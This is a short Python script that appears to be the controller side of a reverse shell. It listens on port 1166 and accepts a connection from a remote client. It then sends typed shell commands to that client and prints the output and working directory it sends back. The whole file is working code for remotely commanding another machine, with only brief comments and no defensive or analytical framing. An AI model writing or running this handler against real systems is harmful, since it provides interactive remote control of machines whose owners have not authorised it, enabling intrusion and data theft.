import os
import socket

# default ip for server,you can change this .
ip='0.0.0.0'
port=1166
#separator string for sending 2 message in one go.
separator="<sep>"
#create socket object.
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#bind and listening.
s.bind((ip, port))
s.listen(10)
print(f'Listening on {ip} : {port}')
#accepting any connection.
client, addr=s.accept()
#receiving the current directory .
cwd=client.recv(1024).decode()
print('[+] Current working directory:', cwd)
while True:
    #get the command prompt.
    msg=input(f'{cwd} $-> ')
    if not msg.strip():
        #empty command.
        continue
    #send encoding command.
    client.send(msg.encode())
    if msg.lower()=='exit':
        #if command is exit, break out the loop.
        break
    #receive command output.
    output=client.recv(1024*128).decode()
    #split command output and current directory.
    result, cwd=output.split(separator)
    #print output.
    print(result)
